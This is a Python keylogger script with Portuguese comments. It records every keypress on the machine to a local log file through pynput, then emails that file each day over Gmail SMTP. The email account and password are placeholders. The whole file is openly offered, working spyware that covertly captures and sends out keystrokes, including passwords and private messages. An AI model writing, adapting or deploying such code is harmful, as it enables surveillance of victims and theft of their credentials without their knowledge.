#em pynput, importar o método Listener do teclado
from pynput.keyboard import Listener

#importação do smtplib 
import smtplib

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

from time import sleep
import schedule
import threading
import time

#==============================================================

def captura():
    def capturar(tecla):
        '''
        Esta função será responsável por receber a tecla pressionada
        via Listener e escrever no arquivo de log
        '''
        #===========================================================

        #dicionário com as teclas a serem traduzidas
        traducao_teclas = {
            "Key.space": " ",
            "Key.shift": "",
            "Key.enter": "\n",
        }

        #===========================================================

        #converter a tecla pressionada para string
        dadosdaTecla = str(tecla)

        #===========================================================

        #remover as asplas simples que delimitam os caracteres
        dadosdaTecla = dadosdaTecla.replace("'", "")

        for chave_tecla in traducao_teclas:

            #chave_tecla recebe a tradução da tecla através do dicionário traducao_teclas

            #substituir a tradução da tecla pelo seu valor (traducao_teclas[chave_tecla])
        
            dadosdaTecla = dadosdaTecla.replace(chave_tecla, traducao_teclas[chave_tecla])

        #===========================================================

        #abrir o arquivo de log no modo append
        with open('log.txt', 'a') as arquivo_log:
         arquivo_log.write(dadosdaTecla)

    #===============================================================

#abrir o Listener do teclado e escutar o evento on_press
#quando o evento on_press ocorrer, chamar a função capturar

    with Listener(on_press=capturar) as escutar:
        escutar.join()


#==============================================================

def envio():

    host = 'smtp.gmail.com'
    port = '587'
    login = 'seuemail@gmail.com'
    senha = 'suasenha'

    server = smtplib.SMTP(host, port)

    server.ehlo()
    server.starttls()
    server.login(login, senha)

    corpo = 'Meus logs recebidos!'

    email_msg = MIMEMultipart()
    email_msg['From'] = login
    email_msg['To'] = login
    email_msg['Subject'] = 'Meu e-mail enviado por key'
    email_msg.attach(MIMEText(corpo, 'plain'))

    cam_arquivo = 'log.txt'
    anexo = open(cam_arquivo, 'rb')

    att = MIMEBase('application', 'octet-stream')
    att.set_payload(anexo.read())
    encoders.encode_base64(att)

    att.add_header('Content-Disposition', f'attachment; filename = log.txt')
    # anexo.close()
    email_msg.attach(att)

#==============================================================

    server.sendmail(email_msg['From'], email_msg['To'], email_msg.as_string())

    server.quit()

#==============================================================

    #schedule.every(10).seconds.do(envio)
    schedule.every().day.at("09:00").do(envio)

    while True:
        #A cada 1 segundo vai estar verificando se precisa enviar de novo
        schedule.run_pending()
        sleep(1)

#==============================================================

threading.Thread(target=captura).start()
threading.Thread(target=envio).start()

